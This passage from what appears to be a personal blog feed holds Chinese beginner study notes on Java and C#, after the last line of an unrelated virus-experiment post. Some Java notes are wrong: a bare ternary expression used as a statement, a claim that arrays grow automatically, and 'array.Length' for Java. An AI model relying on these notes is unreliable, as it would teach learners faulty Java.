<p>这个实验真的做的脑壳疼，本来人就菜，做这个还得东找西造，累的不要不要的。不过也坚定了我做东西要记录的想法，不然到时候真的记不住，太操蛋了-_^</p>
]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Virus</tag>
      </tags>
  </entry>
  <entry>
    <title>Java从入门到入土</title>
    <url>/hexo-test/Information-Security-Study/Code-Language/Java/Java/</url>
    <content><![CDATA[<img data-src="/hexo-test/Information-Security-Study/Code-Language/Java/Java/OIP.jfif" class title="入土">
<a id="more"></a>
<h1 id="Java介绍"><a href="#Java介绍" class="headerlink" title="Java介绍"></a>Java介绍</h1><h2 id="Java常用概念"><a href="#Java常用概念" class="headerlink" title="Java常用概念"></a>Java常用概念</h2><p>网站=网页+后端服务器<br>Java靠JVM虚拟机实现跨平台，JVM本身不允许跨平台<br>编写代码（JRE，源文件）-&gt;编译代码（JDK翻译工具，.class字节码文件）-&gt;运行代码（JDK运行工具，JVM虚拟机）<br>类：Java文件在代码中的集合体现<br>类库：存放读个Java文件的仓库<br>核心类库：Java已经写好的，非常核心的，代码仓库<br>JDK：包含了代码的编译工具和运行工具<br><strong>pubilc class 类名：public 限定类名称与文件名保持一致</strong><br>public static void main(String[] args){}<br>//单行注释<br>/* 多行注释 <em>/<br>*</em>关键字**：被Java赋予了特定含义得英文单词</p>
<h2 id="面向对象和面向过程"><a href="#面向对象和面向过程" class="headerlink" title="面向对象和面向过程"></a>面向对象和面向过程</h2><p><strong>面向过程（Procedure Oriented Programming）</strong>：是一种以过程为中心的编程思想，实现功能的每一步，都是自己实现的</p>
<p><strong>面向对象编程（Object Oriented Programming）</strong>：是一种以对象为中心的编程思想，通过指挥对象实现具体的功能<br> 对象 ：指客观存在的事物</p>
<h2 id="面向对象三大特征之一（封装、继承、多态）"><a href="#面向对象三大特征之一（封装、继承、多态）" class="headerlink" title="面向对象三大特征之一（封装、继承、多态）"></a><strong>面向对象三大特征之一（封装、继承、多态）</strong></h2><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>隐藏实现细节，仅对外暴露公共的访问方式</p>
<p><strong>作用：</strong></p>
<ol>
<li>提高安全性</li>
<li>实现代码的组件化</li>
</ol>
<p><strong>规范：</strong></p>
<ol>
<li>建议成员变量都私有<br>private修饰的方法，成员变量，构造器等职能在本类被使用</li>
<li>提供成套的getter+setter方法暴露成员变量的取值和赋值<br>public修饰符，公开</li>
</ol>
<p><strong>核心思想：</strong><br>    合理隐藏，合理暴露</p>
<p>封装是Java代码的风格，机时代吗毫无意义，也仍然要这么写</p>
<h3 id="继承（extends）"><a href="#继承（extends）" class="headerlink" title="继承（extends）"></a>继承（extends）</h3><h2 id="常见关键字"><a href="#常见关键字" class="headerlink" title="常见关键字"></a>常见关键字</h2><p><strong>private关键字</strong> <strong>：</strong><br>    权限修饰符；可以用来修饰成员（变量、方法），限定成员只能在本类中访问；针对被修饰的成员变量，需要通过定制的方法进行赋值与访问 </p>
<p><strong>static关键字：</strong></p>
<p> <strong>this关键字 ：</strong><br>    调用本类的成员，解决局部变量和成员变量重名问题<br>    this代表所在类的对象引用，调用的是谁就是代表谁</p>
<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>整合多个条件语句</p>
<ul>
<li>&amp; 与（两个判断语句都会执行）</li>
<li>| 或</li>
<li>! 非</li>
<li>^ 异或</li>
<li>&amp;&amp; 短路与（当符号左边为false时，右边就不执行了）</li>
<li>|| 短路或 （当符号左边为true时，右边就不执行了）<br>三元运算符：<br>关系表达式 ? 表达式1 : 表达式2;（执行流程：当判断式为true时执行表达式1，反之则执行表达式2）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SanYuan</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> h1 = <span class="number">150</span>,h2 = <span class="number">210</span>,h3 = <span class="number">165</span>;</span><br><span class="line">        </span><br><span class="line">		<span class="keyword">int</span> tempH = (h1&gt; h2) ? h1 : h2;</span><br><span class="line">        </span><br><span class="line">		(tempH &gt; h3) ? tempH : h3; <span class="comment">//求取三个值中的最大值</span></span><br><span class="line">        </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>在switch语句中，如果case控制的语句体后面不写break，将会出现穿透现象（当case出现穿透，后续的switch语句将不会具有匹配效果，将会直接执行后续case语句中的代码，直至遇到break或者将switch中的代码执行完毕才会停止）</em></p>
<h1 id="IDEA-操作流程"><a href="#IDEA-操作流程" class="headerlink" title="IDEA 操作流程"></a>IDEA 操作流程</h1><p>项目 -&gt; module （一个模块中可以存放实现功能的代码，并使用包来管理类文件）-&gt; package（包） -&gt; class（类）    </p>
<ul>
<li>创建project项目<ul>
<li>创建module模块</li>
<li>创建package</li>
<li>创建class</li>
<li>编写代码</li>
<li>编译运行</li>
</ul>
</li>
</ul>
<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a><strong>快捷键</strong></h2><p>psvm+回车 ：快速生成main方法<br>sout + 回车 ：生成输出语句<br>alt + 1 ：打开\隐藏 工程目录结构<br>alt + 4 ：打开\隐藏 控制台<br>ctrl + alt + L ：格式化代码 （美化格式）<br>alt + enter ： 代码修正提示<br>Ctrl + D ：向下复制一行<br>Ctrl + X : 剪切当前行<br>Ctrl + / ：批量加入单行注释<br>Ctrl + shift + / ：批量加入多行注释<br>alt + shift + 向上方向键 ：上移当前行<br>alt + shift + 向下方向键 ：下移当前行</p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是一个容器，用来存贮同种数据类型或更小类型的多个值</p>
<h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><p>格式 ：int[] array | int array[]</p>
<p>打印数组名的时候，会打印出数组的内存地址</p>
<p>初始化 ：</p>
<ul>
<li><p>动态初始化：int[] = new int[5]，定义数组的长度（会自动增长），值由系统自定义</p>
</li>
<li><p>静态初始化：int[] array = new int[] { 1,2,3 }</p>
</li>
</ul>
<h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><p>格式 ：数据类型[][] 变量名</p>
<ul>
<li>动态初始化 ：数据类型 变量名 = new 数据类型[m][n]</li>
<li>静态初始化 ：数据类型[][] 变量名 = new 数据类型[][]{ {元素1,元素2,…},{元素1,元素2,…},{元素1,元素2,…} }     数据类型[][] 变量名 = { {元素1,元素2,…},{元素1,元素2,…},{元素1,元素2,…} } </li>
</ul>
<h2 id="数组和集合的区别"><a href="#数组和集合的区别" class="headerlink" title="数组和集合的区别"></a>数组和集合的区别</h2><p>集合 ：提供了一种存储空间可变的储存模型，存储的数据容量可以发生改变</p>
<p>数组的容量是固定的，集合是可变的</p>
<h2 id="数组常见问题"><a href="#数组常见问题" class="headerlink" title="数组常见问题"></a>数组常见问题</h2><ul>
<li>索引访问越界 ：访问了数组未定义的索引</li>
<li>空指针异常 ：访问的数组已经不再指向堆内存中的数据，造成空指针异常</li>
</ul>
<p><strong>动态获取数组长度 ：array.Length</strong></p>
<h1 id="Java中内存分配"><a href="#Java中内存分配" class="headerlink" title="Java中内存分配"></a>Java中内存分配</h1><p>​    Java程序运行时，需要在内存中分配空间。为了提高运算效率，就对空间进行了不同区域的划分，每一片区域都有特定的数据处理方式和内存管理方式。</p>
<pre><code>* 栈内存 ：方法运行时进入的内存，局部变量都存放在这块内存中
* 堆内存 ：new出来的内容都会进入堆内存，并且会存在地址值（每new一次都会在堆内存中新开辟一块空间，不会出现重复现象，但是可以重复利用同一块地址）
* 方法区 ：字节码文件（.class文件）加载时进入的内存
* 本地方法栈 ：调用操作系统相关资源
* 寄存器 ：交给CPU区使用</code></pre><h1 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h1><pre><code>* 二进制 ：0b开头
* 八进制 ：0开头
* 十六进制 ：0x开头
* 输出其他进制的内容会被转换为10进制</code></pre><h2 id="原、反、补码"><a href="#原、反、补码" class="headerlink" title="原、反、补码"></a>原、反、补码</h2><ol>
<li>原码 ：即数据的二进制表示，最高位为符号位——0为正数，1为负数</li>
<li>反码 ：正数的反码与原码一致；负数的反码是对原码按位取反，但符号位不变</li>
<li>补码 ：正数的补码与原码一致；负数的补码是该数的反码加1</li>
<li><strong>计算机中的数据都是以二进制补码的形式在进行运算</strong></li>
</ol>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><ol>
<li>&amp;（与）：遇0则0</li>
<li>|（或）：遇1则1</li>
<li>^（异或）：相同则0，不同则1（一个数被同一个数异或两遍值不变）</li>
<li>~（取反）：全部取反，<strong>包括符号位</strong></li>
</ol>
<h2 id="位移运算符"><a href="#位移运算符" class="headerlink" title="位移运算符"></a>位移运算符</h2><ol>
<li>“&lt;&lt;” ：有符号左移运算，二进制向左移动，左边符号位丢弃，右边补0，左移多少位就乘以2的几次幂</li>
<li>“&gt;&gt;” ：有符号右移，使用符号位进行补位，向右移动几位就是除以2的几次幂</li>
<li>“&gt;&gt;&gt;” ：无符号右移，无论符号位是0还是1，都补0</li>
</ol>
<h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p> <strong>属性</strong> ：该事物的各种特征（各种标志）<br> <strong>行为</strong> ：该事物存在的功能（能够做的事情）<br><strong>类</strong> ：是对生活中一类具有共同特征的事物的抽象<br><strong>对象</strong> ：是能够看得到摸得着的真实存在的实体<br>    <strong><em>类是对象的描述，对象是类的实例</em></strong></p>
<h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a><strong>类的定义</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* 类名 ：<span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名（类名的首字母应该大写，<span class="title">ClassDemo</span>；在一个<span class="title">Java</span>代码文件中只能有一个用<span class="title">public</span>修饰的类）</span></span><br><span class="line">* 成员变量（Field: 描述类和对象的属性信息） ：数据类型 变量名;</span><br><span class="line">* 成员方法（Method: 描述类或者对象的行为信息） ：方法;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 类名</span>&#123;</span><br><span class="line">    <span class="comment">// 类中的五大成分</span></span><br><span class="line">	<span class="comment">// 1.成员变量（属性）</span></span><br><span class="line">	数据类型 变量名;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 2.成员方法（行为）</span></span><br><span class="line">	方法;</span><br><span class="line">    <span class="comment">// 3.构造器 （初始化类的对象数据的）</span></span><br><span class="line">    <span class="comment">// 4.内部类</span></span><br><span class="line">    <span class="comment">// 5.代码块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 1.成员变量</span></span><br><span class="line">	<span class="keyword">public</span> String name ;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">char</span> sex ;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> age ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="对象的创建与使用"><a href="#对象的创建与使用" class="headerlink" title="对象的创建与使用"></a>对象的创建与使用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// **创建对象** ：</span></span><br><span class="line">类名 对象名 = <span class="keyword">new</span> 类名();	<span class="comment">//Scanner sc = new Scanner();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//**使用对象** ：</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用成员变量 ：</span></span><br><span class="line">对象名.变量名（sc.value）</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用成员方法 ：</span></span><br><span class="line">对象名.方法名()（sc.nextInt()）</span><br></pre></td></tr></table></figure>




<p>​        </p>
<h1 id="方法（类似函数）"><a href="#方法（类似函数）" class="headerlink" title="方法（类似函数）"></a>方法（类似函数）</h1><ul>
<li>方法就是一段具有独立功能的代码，不调用就不执行</li>
<li>为什么要有方法 ：提高代码的复用性</li>
<li>方法必须先创建才可以使用，该过程称为方法定义</li>
<li>方法创建过后并不是直接运行的，需要手动使用后才执行，该过程称为方法调用</li>
</ul>
<h2 id="方法定义（跟main同级，不能嵌套定义）"><a href="#方法定义（跟main同级，不能嵌套定义）" class="headerlink" title="方法定义（跟main同级，不能嵌套定义）"></a>方法定义（跟main同级，不能嵌套定义）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> 方法名()&#123;</span><br><span class="line">	code ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> 方法名(数据类型 变量名,.....)&#123;</span><br><span class="line">	code ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="构造方法（构造器，Constructor）"><a href="#构造方法（构造器，Constructor）" class="headerlink" title="构造方法（构造器，Constructor）"></a>构造方法（构造器，Constructor）</h2><p>当构建、创造对象的时候，所调用的方法；初始化一个类的对象并返回引用</p>
<p>方法名需要跟类名相同，大小写也要一致</p>
<ul>
<li>没有返回值类型，连void也没有</li>
<li>没有具体的返回值（不能由return带回具体的结果）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">classname</span><span class="params">()</span></span>&#123;</span><br><span class="line">    code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>构造方法的注意事项</strong> ：</p>
<ul>
<li>创建 ：如果没有定义构造方法，系统会提供一个默认的无参数构造方法；反之则不会提供默认的构造方法</li>
<li>重载 ：如果定义了带参构造方法，要使用无参方法，那么需要重新编写一个无参方法</li>
</ul>
<p>Javabean类 ：封装数据</p>
<h2 id="方法调用"><a href="#方法调用" class="headerlink" title="方法调用"></a>方法调用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方法名();</span><br><span class="line"></span><br><span class="line">方法名(数据);（**需要用变量来接收返回的值**）</span><br></pre></td></tr></table></figure>

<h2 id="方法调用过程"><a href="#方法调用过程" class="headerlink" title="方法调用过程"></a>方法调用过程</h2><ul>
<li>没有被调用的时候，在方法区中的字节码文件（.class）总储存</li>
<li>调用时进入栈内存中运行</li>
</ul>
<p>形参和实参 ：</p>
<ul>
<li>形参 ：形式参数，是指方法定义中的参数</li>
<li>实参 ：实际参数，方法调用时的参数</li>
</ul>
<h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>​    方法名相同，参数也完全相同，称为方法的重复定义，是一种冲突性的错误；在调用方法时，Java虚拟机会通过参数的不同来区分同名的方法</p>
<pre><code>* 在同一个类中，定义了多个同名的方法，但每个方法具有不同的参数类型（数据类型）或参数个数，这些同名的方法，就构成了重载关系。
* 参数不同 ：个数不同、类型不同、顺序不同
* 识别方法之间是否为重载关系，只看方法名和参数，与返回值无关</code></pre><h1 id="变量与常量"><a href="#变量与常量" class="headerlink" title="变量与常量"></a>变量与常量</h1><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a><strong>常量</strong></h2><p>代码执行过程中其值不会发生变化的量</p>
<ul>
<li><p>空常量（null）不能被输出打印字符</p>
</li>
<li><p>常量：单引号括起来的数据，只能包含单个字符</p>
</li>
</ul>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a><strong>变量</strong></h2><p>内存总存储数据的空间，空间存储着不断发生变化的数据，定义变量即在内存中申请一个空间</p>
<p><strong>== 作比较 ：</strong><br><strong>基本类型 ：比较数据值是否相同</strong><br><strong>引用类型 ：比较地址值是否相同</strong></p>
<p><em>变量类型 变量名 = 值;</em></p>
<p><strong>标识符</strong>：给类、方法、变量等起名字的字符</p>
<ul>
<li><p>由数字、字母、下划线_、和$组成</p>
</li>
<li><p>不能是数字开头</p>
</li>
<li><p>不能是关键字</p>
</li>
<li><p>区分大小写</p>
</li>
</ul>
<p><strong>定义float时需要在数值后面加上F(f)，定义long类型时需要加上L(l)</strong></p>
<h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a><strong>变量的作用域</strong></h3><p>只在他所在的大括号内有效｛当大括号内部代码执行完毕后，内部所定义的变量将从内存中移除｝<br>计算机中存储的最小信息单元是位（bit）最小的存储单元是字节（byte）<br>1 byte = 8 bit</p>
<h3 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h3><ul>
<li>成员变量 ：类中方法外（一个类中的全局变量）；在堆内存中；生命周期跟整个对象相同；有默认的初始化值</li>
<li>局部变量 ：方法中的局部变量；在栈内存中；声明周期跟所属的方法相同；没有默认的初始化值，必须先定义赋值才能使用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Modeus</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">		Scanner sc = <span class="keyword">new</span> Scanner(System.in); <span class="comment">//创建对象</span></span><br><span class="line">		<span class="keyword">int</span> a = sc.nextInt(); <span class="comment">//接收输入</span></span><br><span class="line">		</span><br><span class="line">		System.out.println(); <span class="comment">//输出</span></span><br><span class="line">		<span class="keyword">byte</span> d = <span class="number">3</span> + <span class="number">4</span>; <span class="comment">// 不会报错，Java存在常量优化机制，会在编译时让3、4相加，并判断是否在byte取值范围内，不在则报错，在则通过编译</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Information Security Study</category>
        <category>Code Language</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>C＃学习笔记</title>
    <url>/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>C#程是利用命名空间组织起来的。如果要调用某个命名空间的额类或者方法，则需要用 using 引入命名空间<br>    *using 指令的基本形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using 命名空间名;*</span><br></pre></td></tr></table></figure>
<p>当使用命名空间内的类时 （如一个N1的命名空间有一个类A中有一个方法Myls），需要实例化这个类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*A oa &#x3D; new A();		&#x2F;&#x2F;实例化类</span><br><span class="line">oa.Myls();		&#x2F;&#x2F;调用类A中的Myls方法*</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using N1;	&#x2F;&#x2F;使用using指令引入命名空间N1</span><br><span class="line">namespace Test02</span><br><span class="line">&#123;</span><br><span class="line">	class Program</span><br><span class="line">	&#123;</span><br><span class="line">		static void Main(string[] args)</span><br><span class="line">		&#123;</span><br><span class="line">			A oa &#x3D; new A();</span><br><span class="line">			oa.Myls();</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">namespace N1		&#x2F;&#x2F;建立命名空间 N1</span><br><span class="line">&#123;</span><br><span class="line">	class A		&#x2F;&#x2F;在N1中声明一个类A</span><br><span class="line">	&#123;</span><br><span class="line">		public void Myls()</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine (&quot;...&quot;);		&#x2F;&#x2F;C#中输出字符串</span><br><span class="line">			Console.ReadLine();		&#x2F;&#x2F;等待输入</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><p>类是一种数据结构，他可以封装数据成员、函数成员和其他的类。C#中的所有语句都必须位于类内。使用任何新的类之前都必须声明它，一个类一旦被声明，就可以当做一种新的类型来使用。在C#中通过class关键字来声明。<br>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class MyClass</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Main"><a href="#Main" class="headerlink" title="Main"></a>Main</h2><img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/Main1.png" class>


<h2 id="标识符及关键字"><a href="#标识符及关键字" class="headerlink" title="标识符及关键字"></a>标识符及关键字</h2><p>标识符命名规则：<br>要注意的是C#的标识符只能由数字、字母和下划线组成，并且必须以字符或者下划线开头。<font color="red">在对类、变量、方法等进行命名时，应避免与标识符和关键字重名，否则可能导致所编写的程序中响应的引用出现未知的错误。</font></p>
<h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>C#中变量的类型分为值类型和引用类型两类，如同C语言一般，C#的值类型变量也分为整数类型、浮点类型和布尔类型。</p>
<h3 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h3><p>1、整数类型</p>
<p> C#中的整数类型有sbyte、short、int、long、byte、ushort、uint、ulong<br><font color="green" size="1.5">其中值得注意的是：byte类型和short类型都是范围比较小的整数，如果正整数范围没有超过65535，声明为ushort类型即可，当数值适用于byte时要注意数值的大小，否则可能导致运算溢出的错误。</font></p>
<p>2、浮点类型</p>
<p>浮点类型主要用于处理含有小数的数值数据，浮点类型主要包含float和double两种数值类型。</p>
<ul>
<li><font color="red" size="1.5">如不作任何设置，则一切含有小数的数值都将被认为是double类型</font></li>
</ul>
<p>3、布尔类型</p>
<p>布尔类型主要用来表示true/false值，一个布尔型变量的值只能是true/false，不能将其他的值赋给布尔变量，也不能与其他的变量进行转换。</p>
<p>4、常量</p>
<p>利用const 关键字来创建常量，并在创建常量时设置它的初始值一旦设置就不再允许更改</p>
<p> 5、数值的强制转换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">float MySum &#x3D; 9.27f	&#x2F;&#x2F;使用f强制指定为float类型</span><br><span class="line">double MyDou &#x3D; 927d	&#x2F;&#x2F;使用d强制指定为double类型</span><br><span class="line">double x &#x3D; 19835.165;</span><br><span class="line">int y &#x3D; (int)x;		&#x2F;&#x2F;强制将double 类型的数转换成 int 类型</span><br><span class="line">也可以使用Convert关键字进行强制转换：</span><br><span class="line">int y &#x3D; Convert.ToInt32(x);</span><br></pre></td></tr></table></figure>
<ul>
<li>如果需要使用float类型的变量，必须在数值的后面紧跟f或F，否则编译器将将其作为double类型的变量处理，也可以在double类型变量的前面加上（float）对其进行强制转换。</li>
</ul>
<h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3> <img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B.png" class title="引用类型">
 <img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B1.png" class title="引用类型">

<p>实例（创建一个类C，并在类中建立一个字段Value，并初始化为0。然后在程序的其他地方通过new创建该类的引用类型变量）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Program</span><br><span class="line">&#123;</span><br><span class="line">	class C		&#x2F;&#x2F;创建一个类C</span><br><span class="line">	&#123;</span><br><span class="line">		public int Value &#x3D;0;		&#x2F;&#x2F;声明一个公共int类型的变量Value</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	static void Main (string[] args)</span><br><span class="line">	&#123;</span><br><span class="line">		int v1 &#x3D;0;		&#x2F;&#x2F;声明一个int类型变量v1，赋初值为0</span><br><span class="line">		int v2 &#x3D;v1;		&#x2F;&#x2F;声明一个int类型变量v2，并将v1的值赋给v2</span><br><span class="line">		v2 &#x3D; 927;		&#x2F;&#x2F;将v2的值更改为927</span><br><span class="line">		C r1 &#x3D; new C();		&#x2F;&#x2F;使用new关键字创建引用对象</span><br><span class="line">		C r2 &#x3D;r1;			&#x2F;&#x2F;是r1等于r2</span><br><span class="line">		r2.Value &#x3D; 112;		&#x2F;&#x2F;设置r2的Value值</span><br><span class="line">		Console.WriteLine(“Value:&#123;0&#125;,&#123;1&#125;”,v1,v2);		&#x2F;&#x2F;输出v1和v2</span><br><span class="line">		Console.WriteLine(“Refs:&#123;0&#125;,&#123;1&#125;”,r1.Value,r2.Value);		&#x2F;&#x2F;输出引用类型对象的Value值</span><br><span class="line">		Console.ReadLine();</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E5%AE%9E%E4%BE%8B%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C.png" class title="结果">

<h3 id="值类型和引用类型的区别"><a href="#值类型和引用类型的区别" class="headerlink" title="值类型和引用类型的区别"></a>值类型和引用类型的区别</h3><p>实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp1_Cxiapu</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">		class Program</span><br><span class="line">		&#123;</span><br><span class="line">			static void Main(string[] args)</span><br><span class="line">			&#123;</span><br><span class="line">				ReferenceAndValue.Demonstration();      &#x2F;&#x2F;调用类中的方法</span><br><span class="line">				Console.ReadLine();</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		public class stamp</span><br><span class="line">		&#123;</span><br><span class="line">			public string Name &#123; get; set; &#125;        &#x2F;&#x2F;定义引用类型</span><br><span class="line">			public int Age &#123; get; set; &#125;        &#x2F;&#x2F;定义值类型</span><br><span class="line">		&#125;</span><br><span class="line">		public static class ReferenceAndValue</span><br><span class="line">		&#123;</span><br><span class="line">			public static void Demonstration()</span><br><span class="line">			&#123;</span><br><span class="line">				stamp Stamp_1 &#x3D; new stamp &#123; Name &#x3D; &quot;Premiere&quot;, Age &#x3D; 25 &#125;;      &#x2F;&#x2F;实例化</span><br><span class="line">				stamp Stamp_2 &#x3D; new stamp &#123; Name &#x3D; &quot;Again&quot;, Age &#x3D; 47 &#125;;     &#x2F;&#x2F;实例化</span><br><span class="line">				int age &#x3D; Stamp_1.Age;      &#x2F;&#x2F;获取值类型Age的值</span><br><span class="line">				Stamp_1.Age &#x3D; 22;       &#x2F;&#x2F;修改值类型的值</span><br><span class="line">				stamp guru &#x3D; Stamp_2;       &#x2F;&#x2F;获取Stamp_2中的值</span><br><span class="line">				Stamp_2.Name &#x3D; &quot;Again Amend&quot;;       &#x2F;&#x2F;修改引用的Name值</span><br><span class="line">				Console.WriteLine(&quot;Stamp_1&#39;s age:&#123;0&#125;&quot;, Stamp_1.Age);       &#x2F;&#x2F;显示Stamp_1中的Age值</span><br><span class="line">				Console.WriteLine(&quot;age’s value:&#123;0&#125;&quot;, age);       &#x2F;&#x2F;显示age的值</span><br><span class="line">				Console.WriteLine(&quot;Stamp_2’s name:&#123;0&#125;&quot;, Stamp_2.Name);      &#x2F;&#x2F;显示Stamp_2中的Name值</span><br><span class="line">				Console.WriteLine(&quot;guru’s name:&#123;0&#125;&quot;, guru.Name);     &#x2F;&#x2F;显示guru中的Name值</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<img data-src="/hexo-test/Game/Code-Language/C%EF%BC%83-StudyNote/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%8C%BA%E5%88%AB.png" class title="结果">



<p><strong>值类型：</strong><br>创建时就在内存中占用了相应的数值类型的字节数，修改值类型就是修改相应的内存中的值<br><strong>引用类型：</strong><br>创建时指向的是内存中的一个地址，修改他相当于修改对应地址中的值，将对所有引用同一类型的值造成影响（类似于指针）</p>
<h3 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h3><p> C#中使用enum来声明枚举变量，它用于声明一组具有相同性质的常量。</p>
<ul>
<li>在定义枚举类型时，如果不对其进行赋值，默认情况下，第一个枚举数的值为0，后面每个枚举值依次加一。</li>
</ul>
<p>实例：</p>
